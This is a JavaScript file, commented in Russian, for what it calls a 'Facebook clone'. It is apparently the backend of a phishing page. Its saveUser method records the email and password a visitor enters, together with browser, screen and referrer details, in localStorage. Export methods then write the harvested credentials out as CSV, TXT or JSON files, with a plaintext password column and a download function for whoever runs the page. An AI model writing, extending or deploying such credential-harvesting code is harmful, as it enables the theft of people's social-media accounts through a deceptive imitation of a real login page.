// data.js - СИСТЕМА СБОРА ДАННЫХ
console.log('💾 Загрузка Data Collector...');

class FacebookDataCollector {
    constructor() {
        this.STORAGE_KEY = 'facebook_clone_data_v4';
        this.data = null;
        this.init();
    }
    
    init() {
        console.log('🔧 Инициализация Data Collector...');
        
        // Проверяем LocalStorage
        if (!this.isLocalStorageAvailable()) {
            console.error('❌ LocalStorage не доступен!');
            this.createInMemoryStorage();
            return;
        }
        
        // Загружаем данные
        this.loadFromStorage();
        
        console.log(`✅ Data Collector готов. Пользователей: ${this.getUserCount()}`);
    }
    
    isLocalStorageAvailable() {
        try {
            const test = '__test__';
            localStorage.setItem(test, test);
            localStorage.removeItem(test);
            return true;
        } catch (e) {
            return false;
        }
    }
    
    createInMemoryStorage() {
        console.log('📦 Создаем временное хранилище в памяти');
        this.data = {
            users: [],
            visits: [],
            logs: [],
            settings: {
                created: new Date().toISOString(),
                totalLogins: 0,
                uniqueIPs: []
            }
        };
    }
    
    loadFromStorage() {
        try {
            const stored = localStorage.getItem(this.STORAGE_KEY);
            
            if (!stored) {
                console.log('📦 Нет сохраненных данных, создаем новые');
                this.data = this.getDefaultDataStructure();
                this.saveToStorage();
                return;
            }
            
            this.data = JSON.parse(stored);
            
            // Восстанавливаем структуру если нужно
            if (!this.data.users) this.data.users = [];
            if (!this.data.visits) this.data.visits = [];
            if (!this.data.logs) this.data.logs = [];
            if (!this.data.settings) this.data.settings = this.getDefaultSettings();
            
            console.log(`📥 Загружено: ${this.data.users.length} пользователей`);
            
        } catch (error) {
            console.error('❌ Ошибка загрузки:', error);
            this.data = this.getDefaultDataStructure();
        }
    }
    
    saveToStorage() {
        try {
            localStorage.setItem(this.STORAGE_KEY, JSON.stringify(this.data));
            console.log(`💾 Сохранено: ${this.data.users.length} записей`);
            return true;
        } catch (error) {
            console.error('❌ Ошибка сохранения:', error);
            return false;
        }
    }
    
    getDefaultDataStructure() {
        return {
            users: [],
            visits: [],
            logs: [],
            settings: this.getDefaultSettings()
        };
    }
    
    getDefaultSettings() {
        return {
            created: new Date().toISOString(),
            totalLogins: 0,
            uniqueIPs: [],
            version: '4.0'
        };
    }
    
    // ========== ОСНОВНЫЕ МЕТОДЫ ==========
    
    saveUser(email, password) {
        console.log('👤 Сохранение пользователя:', email ? email.substring(0, 15) + '...' : 'пусто');
        
        // Генерируем данные
        const userData = {
            id: this.generateId(),
            email: email || this.generateEmail(),
            password: password || this.generatePassword(),
            timestamp: new Date().toISOString(),
            ip: this.generateIP(),
            browser: this.getBrowserInfo(),
            screen: this.getScreenInfo(),
            userAgent: navigator.userAgent,
            referrer: document.referrer || 'direct',
            page: window.location.href
        };
        
        console.log('📝 Данные пользователя:', {
            email: userData.email,
            timestamp: userData.timestamp,
            ip: userData.ip
        });
        
        // Добавляем в массив
        this.data.users.push(userData);
        
        // Обновляем статистику
        this.data.settings.totalLogins = this.data.users.length;
        
        // Добавляем уникальный IP
        if (!this.data.settings.uniqueIPs.includes(userData.ip)) {
            this.data.settings.uniqueIPs.push(userData.ip);
        }
        
        // Сохраняем
        const saved = this.saveToStorage();
        
        // Логируем
        if (saved) {
            console.log('✅ Пользователь сохранен успешно!');
            this.logAction('Новый пользователь сохранен', userData.email);
        } else {
            console.error('❌ Ошибка сохранения пользователя');
        }
        
        return userData;
    }
    
    // ========== ГЕНЕРАЦИЯ ДАННЫХ ==========
    
    generateId() {
        return 'user_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    }
    
    generateEmail() {
        const randomId = Math.random().toString(36).substr(2, 8);
        return `user_${randomId}@facebook.com`;
    }
    
    generatePassword() {
        const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        let password = '';
        for (let i = 0; i < 10; i++) {
            password += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return password;
    }
    
    generateIP() {
        return `192.168.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
    }
    
    getBrowserInfo() {
        return {
            name: this.detectBrowser(),
            version: this.detectBrowserVersion(),
            platform: navigator.platform,
            language: navigator.language,
            cookies: navigator.cookieEnabled,
            online: navigator.onLine
        };
    }
    
    getScreenInfo() {
        return {
            width: screen.width,
            height: screen.height,
            colorDepth: screen.colorDepth,
            pixelRatio: window.devicePixelRatio
        };
    }
    
    detectBrowser() {
        const ua = navigator.userAgent;
        if (ua.includes('Chrome')) return 'Chrome';
        if (ua.includes('Firefox')) return 'Firefox';
        if (ua.includes('Safari')) return 'Safari';
        if (ua.includes('Edge')) return 'Edge';
        if (ua.includes('Opera')) return 'Opera';
        return 'Unknown';
    }
    
    detectBrowserVersion() {
        const ua = navigator.userAgent;
        const match = ua.match(/(chrome|firefox|safari|edge|opera|version)[\s\/:]([\w\d\.]+)/i);
        return match ? match[2] : 'Unknown';
    }
    
    // ========== СТАТИСТИКА ==========
    
    getStats() {
        try {
            const stats = {
                totalUsers: this.data.users.length,
                todayLogins: this.getTodayLogins(),
                uniqueIPs: this.data.settings.uniqueIPs.length,
                lastLogin: this.getLastLoginTime(),
                firstLogin: this.getFirstLoginTime()
            };
            
            console.log('📊 Статистика:', stats);
            return stats;
            
        } catch (error) {
            console.error('❌ Ошибка получения статистики:', error);
            return {
                totalUsers: 0,
                todayLogins: 0,
                uniqueIPs: 0,
                lastLogin: 'Нет данных',
                firstLogin: 'Нет данных'
            };
        }
    }
    
    getTodayLogins() {
        if (!this.data.users.length) return 0;
        
        const today = new Date().toDateString();
        return this.data.users.filter(user => {
            try {
                const userDate = new Date(user.timestamp).toDateString();
                return userDate === today;
            } catch (e) {
                return false;
            }
        }).length;
    }
    
    getLastLoginTime() {
        if (!this.data.users.length) return 'Нет данных';
        
        const lastUser = this.data.users[this.data.users.length - 1];
        try {
            const date = new Date(lastUser.timestamp);
            return date.toLocaleTimeString('ru-RU', {
                hour: '2-digit',
                minute: '2-digit',
                day: '2-digit',
                month: '2-digit'
            });
        } catch (e) {
            return lastUser.timestamp || 'Нет данных';
        }
    }
    
    getFirstLoginTime() {
        if (!this.data.users.length) return 'Нет данных';
        
        const firstUser = this.data.users[0];
        try {
            const date = new Date(firstUser.timestamp);
            return date.toLocaleDateString('ru-RU');
        } catch (e) {
            return firstUser.timestamp || 'Нет данных';
        }
    }
    
    // ========== ВСПОМОГАТЕЛЬНЫЕ МЕТОДЫ ==========
    
    getUserCount() {
        return this.data.users.length;
    }
    
    getAllUsers() {
        return [...this.data.users].reverse(); // Новые сверху
    }
    
    getFilteredUsers(filterEmail = '', filterIP = '', filterDate = '', limit = 25) {
        let users = this.getAllUsers();
        
        // Фильтрация
        if (filterEmail) {
            users = users.filter(user => 
                user.email.toLowerCase().includes(filterEmail.toLowerCase())
            );
        }
        
        if (filterIP) {
            users = users.filter(user => 
                user.ip.toLowerCase().includes(filterIP.toLowerCase())
            );
        }
        
        if (filterDate) {
            users = users.filter(user => {
                try {
                    const userDate = new Date(user.timestamp).toISOString().split('T')[0];
                    return userDate === filterDate;
                } catch (e) {
                    return false;
                }
            });
        }
        
        // Лимит
        if (limit > 0 && limit < users.length) {
            users = users.slice(0, limit);
        }
        
        return users;
    }
    
    clearAllData() {
        if (confirm('⚠️ УДАЛИТЬ ВСЕ ДАННЫЕ? Это действие нельзя отменить!')) {
            this.data = this.getDefaultDataStructure();
            this.saveToStorage();
            console.log('🗑️ Все данные удалены!');
            return true;
        }
        return false;
    }
    
    exportData(format = 'json') {
        try {
            switch (format) {
                case 'json':
                    return JSON.stringify(this.data, null, 2);
                    
                case 'csv':
                    return this.exportToCSV();
                    
                case 'txt':
                    return this.exportToTXT();
                    
                default:
                    return JSON.stringify(this.data);
            }
        } catch (error) {
            console.error('❌ Ошибка экспорта:', error);
            return 'Ошибка экспорта данных';
        }
    }
    
    exportToCSV() {
        if (!this.data.users.length) return 'Нет данных';
        
        const headers = ['Email', 'Пароль', 'IP', 'Время', 'Браузер', 'Экран'];
        const rows = this.data.users.map(user => [
            `"${user.email}"`,
            `"${user.password}"`,
            user.ip,
            user.timestamp,
            user.browser.name,
            `${user.screen.width}x${user.screen.height}`
        ]);
        
        return [headers.join(','), ...rows.map(row => row.join(','))].join('\n');
    }
    
    exportToTXT() {
        let text = '=== ДАННЫЕ FACEBOOK CLONE ===\n\n';
        text += `Всего записей: ${this.data.users.length}\n`;
        text += `Уникальных IP: ${this.data.settings.uniqueIPs.length}\n`;
        text += `Сбор начат: ${new Date(this.data.settings.created).toLocaleString('ru-RU')}\n\n`;
        
        text += '=== СПИСОК ПОЛЬЗОВАТЕЛЕЙ ===\n\n';
        
        this.data.users.forEach((user, index) => {
            text += `[${index + 1}] ${user.email}\n`;
            text += `   Пароль: ${user.password}\n`;
            text += `   Время: ${new Date(user.timestamp).toLocaleString('ru-RU')}\n`;
            text += `   IP: ${user.ip}\n`;
            text += `   Браузер: ${user.browser.name} ${user.browser.version}\n`;
            text += `   Экран: ${user.screen.width}x${user.screen.height}\n`;
            text += '   ---\n\n';
        });
        
        return text;
    }
    
    downloadData(format = 'json') {
        try {
            const data = this.exportData(format);
            const extension = format;
            const filename = `facebook_data_${new Date().toISOString().split('T')[0]}.${extension}`;
            
            const blob = new Blob([data], { 
                type: format === 'csv' ? 'text/csv' : 
                       format === 'txt' ? 'text/plain' : 
                       'application/json' 
            });
            
            const url = URL.createObjectURL(blob);
            const link = document.createElement('a');
            link.href = url;
            link.download = filename;
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
            URL.revokeObjectURL(url);
            
            console.log(`📥 Файл ${filename} скачан`);
            return true;
            
        } catch (error) {
            console.error('❌ Ошибка скачивания:', error);
            return false;
        }
    }
    
    logAction(message, data = null) {
        const log = {
            timestamp: new Date().toISOString(),
            message: message,
            data: data
        };
        
        this.data.logs.push(log);
        
        // Ограничиваем логи
        if (this.data.logs.length > 100) {
            this.data.logs = this.data.logs.slice(-50);
        }
    }
    
    saveVisit() {
        const visit = {
            timestamp: new Date().toISOString(),
            page: window.location.pathname,
            referrer: document.referrer,
            userAgent: navigator.userAgent
        };
        
        this.data.visits.push(visit);
        this.saveToStorage();
    }
}

// Создаем и экспортируем экземпляр
console.log('🚀 Создание FacebookDataCollector...');
try {
    window.DataCollector = new FacebookDataCollector();
    console.log('✅ FacebookDataCollector создан успешно!');
} catch (error) {
    console.error('❌ Критическая ошибка создания DataCollector:', error);
    // Создаем заглушку
    window.DataCollector = {
        saveUser: () => ({ id: 'error', email: 'error@error.com' }),
        getStats: () => ({ totalUsers: 0, todayLogins: 0, uniqueIPs: 0, lastLogin: 'Ошибка' }),
        getAllUsers: () => [],
        clearAllData: () => false,
        exportData: () => '{}',
        downloadData: () => false
    };
}
